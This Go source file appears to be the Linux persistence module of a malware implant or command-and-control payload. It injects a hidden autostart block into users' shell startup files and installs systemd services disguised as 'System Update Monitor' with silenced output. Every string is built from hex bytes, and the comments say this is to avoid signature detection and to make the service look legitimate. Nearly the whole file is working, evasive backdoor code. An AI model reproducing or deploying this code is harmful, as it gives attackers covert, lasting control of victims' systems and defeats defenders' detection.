// server/docker/payloads/Linux/action_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"golang.org/x/sys/unix"
)

// Persistence strings (constructed to avoid static signatures)
var (
	// Command name
	persistCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74}) // persist

	// Methods
	persistMethodBashrc  = string([]byte{0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                   // bashrc
	persistMethodSystemd = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})             // systemd
	persistMethodRemove  = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})                   // remove

	// Flags
	persistFlagUser    = string([]byte{0x2d, 0x2d, 0x75, 0x73, 0x65, 0x72})                                     // --user
	persistFlagCommand = string([]byte{0x2d, 0x2d, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64})                   // --command
	persistFlagFile    = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x65})                                     // --file
	persistFlagFiles   = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x65, 0x73})                               // --files
	persistFlagName    = string([]byte{0x2d, 0x2d, 0x6e, 0x61, 0x6d, 0x65})                                     // --name

	// Paths
	persistProcSelfExe   = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65})                                                                               // /proc/self/exe
	persistEtcSystemd    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d})                                                 // /etc/systemd/system
	persistDotConfig     = string([]byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67})                                                                                                                         // .config
	persistSystemdDir    = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})                                                                                                                         // systemd
	persistUserDir       = string([]byte{0x75, 0x73, 0x65, 0x72})                                                                                                                                           // user
	persistServiceExt    = string([]byte{0x2e, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                                                                   // .service

	// RC files
	persistBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                           // .bashrc
	persistProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                                     // .profile
	persistBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})       // .bash_profile
	persistZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                                 // .zshrc
	persistTildeSlash  = string([]byte{0x7e, 0x2f})                                                                         // ~/

	// Default service name
	persistDefaultSvc = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65}) // system-update

	// Systemd targets
	persistMultiUserTarget      = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74})                                                       // multi-user.target
	persistDefaultTarget        = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74})                                                                         // default.target
	persistMultiUserTargetWants = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                   // multi-user.target.wants
	persistDefaultTargetWants   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                                     // default.target.wants

	// Service descriptions
	persistDescSystem = string([]byte{0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x20, 0x4d, 0x6f, 0x6e, 0x69, 0x74, 0x6f, 0x72})             // System Update Monitor
	persistDescUser   = string([]byte{0x55, 0x73, 0x65, 0x72, 0x20, 0x53, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72})                   // User Session Manager

	// Systemd service template parts
	persistUnitHeader     = string([]byte{0x5b, 0x55, 0x6e, 0x69, 0x74, 0x5d})                                                                                                                               // [Unit]
	persistDescPrefix     = string([]byte{0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x3d})                                                                                           // Description=
	persistServiceSuffix  = string([]byte{0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                                                                   //  Service
	persistAfterNetwork   = string([]byte{0x41, 0x66, 0x74, 0x65, 0x72, 0x3d, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x6f, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74}) // After=network.target network-online.target
	persistWantsNetwork   = string([]byte{0x57, 0x61, 0x6e, 0x74, 0x73, 0x3d, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x6f, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74}) // Wants=network-online.target
	persistServiceHeader  = string([]byte{0x5b, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x5d})                                                                                                             // [Service]
	persistTypeSimple     = string([]byte{0x54, 0x79, 0x70, 0x65, 0x3d, 0x73, 0x69, 0x6d, 0x70, 0x6c, 0x65})                                                                                                 // Type=simple
	persistRestartAlways  = string([]byte{0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x3d, 0x61, 0x6c, 0x77, 0x61, 0x79, 0x73})                                                                               // Restart=always
	persistRestartSec     = string([]byte{0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x53, 0x65, 0x63, 0x3d, 0x36, 0x30})                                                                                     // RestartSec=60
	persistExecStart      = string([]byte{0x45, 0x78, 0x65, 0x63, 0x53, 0x74, 0x61, 0x72, 0x74, 0x3d})                                                                                                       // ExecStart=
	persistStdOutNull     = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x3d, 0x6e, 0x75, 0x6c, 0x6c})                                                 // StandardOutput=null
	persistStdErrNull     = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x3d, 0x6e, 0x75, 0x6c, 0x6c})                                                       // StandardError=null
	persistSecComment     = string([]byte{0x23, 0x20, 0x53, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x68, 0x61, 0x72, 0x64, 0x65, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x28, 0x6d, 0x61, 0x6b, 0x65, 0x73, 0x20, 0x69, 0x74, 0x20, 0x6c, 0x6f, 0x6f, 0x6b, 0x20, 0x6c, 0x65, 0x67, 0x69, 0x74, 0x69, 0x6d, 0x61, 0x74, 0x65, 0x29}) // # Security hardening (makes it look legitimate)
	persistPrivateTmp     = string([]byte{0x50, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x54, 0x6d, 0x70, 0x3d, 0x79, 0x65, 0x73})                                                                               // PrivateTmp=yes
	persistNoNewPrivs     = string([]byte{0x4e, 0x6f, 0x4e, 0x65, 0x77, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x73, 0x3d, 0x74, 0x72, 0x75, 0x65})                                           // NoNewPrivileges=true
	persistProtectSys     = string([]byte{0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x3d, 0x73, 0x74, 0x72, 0x69, 0x63, 0x74})                                           // ProtectSystem=strict
	persistProtectHome    = string([]byte{0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x48, 0x6f, 0x6d, 0x65, 0x3d, 0x72, 0x65, 0x61, 0x64, 0x2d, 0x6f, 0x6e, 0x6c, 0x79})                                     // ProtectHome=read-only
	persistReadWriteTmp   = string([]byte{0x52, 0x65, 0x61, 0x64, 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x61, 0x74, 0x68, 0x73, 0x3d, 0x2f, 0x74, 0x6d, 0x70})                                                 // ReadWritePaths=/tmp
	persistInstallHeader  = string([]byte{0x5b, 0x49, 0x6e, 0x73, 0x74, 0x61, 0x6c, 0x6c, 0x5d})                                                                                                             // [Install]
	persistWantedBy       = string([]byte{0x57, 0x61, 0x6e, 0x74, 0x65, 0x64, 0x42, 0x79, 0x3d})                                                                                                             // WantedBy=

	// Bash payload template parts
	persistBashIfSudo    = string([]byte{0x69, 0x66, 0x20, 0x5b, 0x20, 0x2d, 0x7a, 0x20, 0x22, 0x24, 0x53, 0x55, 0x44, 0x4f, 0x5f, 0x43, 0x4f, 0x4d, 0x4d, 0x41, 0x4e, 0x44, 0x22, 0x20, 0x5d, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e})                                                 // if [ -z "$SUDO_COMMAND" ]; then
	persistBashIfPgrep   = string([]byte{0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x21, 0x20, 0x70, 0x67, 0x72, 0x65, 0x70, 0x20, 0x2d, 0x66, 0x20, 0x22})                                                                                                                         //     if ! pgrep -f "
	persistBashPgrepEnd  = string([]byte{0x22, 0x20, 0x3e, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c, 0x20, 0x32, 0x3e, 0x26, 0x31, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e})                                                                                           // " > /dev/null 2>&1; then
	persistBashNohup     = string([]byte{0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x28, 0x6e, 0x6f, 0x68, 0x75, 0x70, 0x20})                                                                                                                                                 //         (nohup
	persistBashNohupEnd  = string([]byte{0x20, 0x3e, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c, 0x20, 0x32, 0x3e, 0x26, 0x31, 0x20, 0x26, 0x29, 0x20, 0x32, 0x3e, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c})                                           //  > /dev/null 2>&1 &) 2>/dev/null
	persistBashFi        = string([]byte{0x20, 0x20, 0x20, 0x20, 0x66, 0x69})                                                                                                                                                                                                       //     fi
	persistBashEndFi     = string([]byte{0x66, 0x69})                                                                                                                                                                                                                               // fi
	persistAmpersand     = string([]byte{0x20, 0x26})                                                                                                                                                                                                                               //  &
)

// PersistenceCommand handles various persistence mechanisms
type PersistenceCommand struct{}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	method := args[0]
	switch method {
	case persistMethodBashrc:
		return c.handleBashrcPersistence(args[1:])
	case persistMethodSystemd:
		return c.handleSystemdPersistence(args[1:])
	case persistMethodRemove:
		if len(args) < 2 {
			return CommandResult{
				Output:   Err(E1),
				ExitCode: 1,
			}
		}
		return c.removePersistence(args[1], args[2:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// handleBashrcPersistence adds backdoor to shell initialization files
func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case persistFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case persistFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case persistFlagFile:
			if i+1 < len(args) {
				targetFiles = append(targetFiles, args[i+1])
				i++
			}
		case persistFlagFiles:
			if i+1 < len(args) {
				// Parse comma-separated list
				files := strings.Split(args[i+1], ",")
				for _, f := range files {
					targetFiles = append(targetFiles, strings.TrimSpace(f))
				}
				i++
			}
		}
	}

	// Default to current user
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	// Default command (current binary path)
	if command == "" {
		execPath, err := os.Readlink(persistProcSelfExe)
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath + persistAmpersand
	}

	// Get user info
	u, err := user.Lookup(targetUser)
	if err != nil {
		return CommandResult{
			Output:   ErrCtx(E4, targetUser),
			ExitCode: 1,
		}
	}

	// If no files specified, use defaults
	if len(targetFiles) == 0 {
		targetFiles = []string{
			filepath.Join(u.HomeDir, persistBashrc),
			filepath.Join(u.HomeDir, persistProfile),
			filepath.Join(u.HomeDir, persistBashProfile),
			filepath.Join(u.HomeDir, persistZshrc),
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			// Handle relative paths and ~ expansion
			if strings.HasPrefix(file, persistTildeSlash) {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				// If not absolute, assume it's in user's home
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Backdoor payload without marker
	backdoorPayload := c.generateBashrcPayload(command)

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, ErrCtx(E11, file))
		} else {
			results = append(results, SuccCtx(S1, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload
func (c *PersistenceCommand) generateBashrcPayload(command string) string {
	// Create payload without marker for better stealth using hex-constructed strings
	var payload strings.Builder
	payload.WriteString("\n")
	payload.WriteString(persistBashIfSudo)
	payload.WriteString("\n")
	payload.WriteString(persistBashIfPgrep)
	payload.WriteString(command)
	payload.WriteString(persistBashPgrepEnd)
	payload.WriteString("\n")
	payload.WriteString(persistBashNohup)
	payload.WriteString(command)
	payload.WriteString(persistBashNohupEnd)
	payload.WriteString("\n")
	payload.WriteString(persistBashFi)
	payload.WriteString("\n")
	payload.WriteString(persistBashEndFi)

	return payload.String()
}

// injectIntoRCFile adds backdoor to RC file using direct file operations
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	// Check if file exists
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			// Create file if it doesn't exist
			return os.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	// Read existing content
	content, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	// Check if command is already in file (avoid duplicates without marker)
	// Extract the command from the payload for checking
	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf(Err(E5))
	}

	// Append payload
	newContent := append(content, []byte("\n"+payload)...)

	// Write back with original permissions
	return os.WriteFile(filepath, newContent, info.Mode())
}

// handleSystemdPersistence installs systemd service
func (c *PersistenceCommand) handleSystemdPersistence(args []string) CommandResult {
	var serviceName string
	var userService bool

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case persistFlagName:
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case persistFlagUser:
			userService = true
		}
	}

	// Default service name
	if serviceName == "" {
		serviceName = persistDefaultSvc
	}

	// Get current binary path
	execPath, err := os.Readlink(persistProcSelfExe)
	if err != nil {
		execPath = os.Args[0]
	}

	if userService {
		return c.installUserSystemdService(serviceName, execPath)
	}
	return c.installSystemSystemdService(serviceName, execPath)
}

// installUserSystemdService creates user-level systemd service
func (c *PersistenceCommand) installUserSystemdService(name string, execPath string) CommandResult {
	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// User systemd directory
	systemdDir := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir)

	// Create directory structure
	if err := os.MkdirAll(systemdDir, 0755); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, systemdDir),
			ExitCode: 1,
		}
	}

	// Service file path
	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)

	// Generate service content
	serviceContent := c.generateSystemdService(name, execPath, true)

	// Write service file
	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, serviceFile),
			ExitCode: 1,
		}
	}

	// Enable service using DBus API (if available) or fallback
	if err := c.enableSystemdService(name, true); err != nil {
		// Service created but not auto-enabled
		return CommandResult{
			Output:   SuccCtx(S1, serviceFile),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, serviceFile),
		ExitCode: 0,
	}
}

// installSystemSystemdService creates system-level systemd service
func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string) CommandResult {
	// System systemd directory
	systemdDir := persistEtcSystemd

	// Check if we have write access using unix.Access
	if unix.Access(systemdDir, unix.W_OK) != nil {
		return CommandResult{
			Output:   ErrCtx(E3, systemdDir),
			ExitCode: 1,
		}
	}

	// Service file path
	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)

	// Generate service content
	serviceContent := c.generateSystemdService(name, execPath, false)

	// Write service file
	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, serviceFile),
			ExitCode: 1,
		}
	}

	// Create symlink for multi-user.target.wants to enable on boot
	wantsDir := filepath.Join(systemdDir, persistMultiUserTargetWants)
	if err := os.MkdirAll(wantsDir, 0755); err == nil {
		linkPath := filepath.Join(wantsDir, name+persistServiceExt)
		os.Symlink(serviceFile, linkPath)
	}

	return CommandResult{
		Output:   SuccCtx(S1, serviceFile),
		ExitCode: 0,
	}
}

// generateSystemdService creates systemd service configuration
func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool) string {
	// Generate a plausible looking service using hex-constructed strings
	var svc strings.Builder

	description := persistDescSystem
	if userService {
		description = persistDescUser
	}

	target := persistMultiUserTarget
	if userService {
		target = persistDefaultTarget
	}

	// Build service file content
	svc.WriteString(persistUnitHeader)
	svc.WriteString("\n")
	svc.WriteString(persistDescPrefix)
	svc.WriteString(description)
	svc.WriteString(persistServiceSuffix)
	svc.WriteString("\n")
	svc.WriteString(persistAfterNetwork)
	svc.WriteString("\n")
	svc.WriteString(persistWantsNetwork)
	svc.WriteString("\n\n")
	svc.WriteString(persistServiceHeader)
	svc.WriteString("\n")
	svc.WriteString(persistTypeSimple)
	svc.WriteString("\n")
	svc.WriteString(persistRestartAlways)
	svc.WriteString("\n")
	svc.WriteString(persistRestartSec)
	svc.WriteString("\n")
	svc.WriteString(persistExecStart)
	svc.WriteString(execPath)
	svc.WriteString("\n")
	svc.WriteString(persistStdOutNull)
	svc.WriteString("\n")
	svc.WriteString(persistStdErrNull)
	svc.WriteString("\n\n")
	svc.WriteString(persistSecComment)
	svc.WriteString("\n")
	svc.WriteString(persistPrivateTmp)
	svc.WriteString("\n")
	svc.WriteString(persistNoNewPrivs)
	svc.WriteString("\n")
	svc.WriteString(persistProtectSys)
	svc.WriteString("\n")
	svc.WriteString(persistProtectHome)
	svc.WriteString("\n")
	svc.WriteString(persistReadWriteTmp)
	svc.WriteString("\n\n")
	svc.WriteString(persistInstallHeader)
	svc.WriteString("\n")
	svc.WriteString(persistWantedBy)
	svc.WriteString(target)
	svc.WriteString("\n")

	return svc.String()
}

// enableSystemdService attempts to enable service via systemd
func (c *PersistenceCommand) enableSystemdService(name string, userService bool) error {
	// Try to reload systemd daemon
	if userService {
		// For user services, create a symlink in wants directory
		currentUser, err := user.Current()
		if err != nil {
			return err
		}

		wantsDir := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, persistDefaultTargetWants)
		if err := os.MkdirAll(wantsDir, 0755); err != nil {
			return err
		}

		serviceFile := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, name+persistServiceExt)
		linkPath := filepath.Join(wantsDir, name+persistServiceExt)

		return os.Symlink(serviceFile, linkPath)
	}

	// System service is handled by symlink creation in install function
	return nil
}

// removePersistence removes installed persistence
func (c *PersistenceCommand) removePersistence(method string, args []string) CommandResult {
	switch method {
	case persistMethodBashrc:
		return c.removeBashrcPersistence()
	case persistMethodSystemd:
		var serviceName string
		for i := 0; i < len(args); i++ {
			if args[i] == persistFlagName && i+1 < len(args) {
				serviceName = args[i+1]
			}
		}
		if serviceName == "" {
			serviceName = persistDefaultSvc
		}
		return c.removeSystemdPersistence(serviceName)
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// removeBashrcPersistence removes backdoors from RC files
func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	targetFiles := []string{
		filepath.Join(currentUser.HomeDir, persistBashrc),
		filepath.Join(currentUser.HomeDir, persistProfile),
		filepath.Join(currentUser.HomeDir, persistBashProfile),
		filepath.Join(currentUser.HomeDir, persistZshrc),
	}

	var results []string

	for _, file := range targetFiles {
		if err := c.cleanRCFile(file); err != nil {
			if !os.IsNotExist(err) {
				results = append(results, ErrCtx(E11, file))
			}
		} else {
			results = append(results, SuccCtx(S2, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanRCFile removes backdoor from RC file
func (c *PersistenceCommand) cleanRCFile(filePath string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// Split into lines
	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := 0

	for i := 0; i < len(lines); i++ {
		line := lines[i]

		// Look for our backdoor pattern (checking for the if statement structure)
		if strings.Contains(line, persistBashIfSudo) {
			// Found start of our backdoor, skip next 4 lines (the full backdoor block)
			skipNext = 4
			continue
		}

		if skipNext > 0 {
			skipNext--
			continue
		}

		cleanedLines = append(cleanedLines, line)
	}

	// Remove any trailing empty lines we might have added
	for len(cleanedLines) > 0 && cleanedLines[len(cleanedLines)-1] == "" {
		cleanedLines = cleanedLines[:len(cleanedLines)-1]
	}

	// Write back cleaned content
	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// removeSystemdPersistence removes systemd service
func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult {
	var results []string

	// Try to remove user service
	currentUser, err := user.Current()
	if err == nil {
		userServiceFile := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, name+persistServiceExt)
		userLinkPath := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, persistDefaultTargetWants, name+persistServiceExt)

		if err := os.Remove(userServiceFile); err == nil {
			results = append(results, SuccCtx(S2, userServiceFile))
		}
		os.Remove(userLinkPath)
	}

	// Try to remove system service (if we have permissions)
	systemServiceFile := filepath.Join(persistEtcSystemd, name+persistServiceExt)
	systemLinkPath := filepath.Join(persistEtcSystemd, persistMultiUserTargetWants, name+persistServiceExt)

	if err := os.Remove(systemServiceFile); err == nil {
		results = append(results, SuccCtx(S2, systemServiceFile))
	}
	os.Remove(systemLinkPath)

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E4, name),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
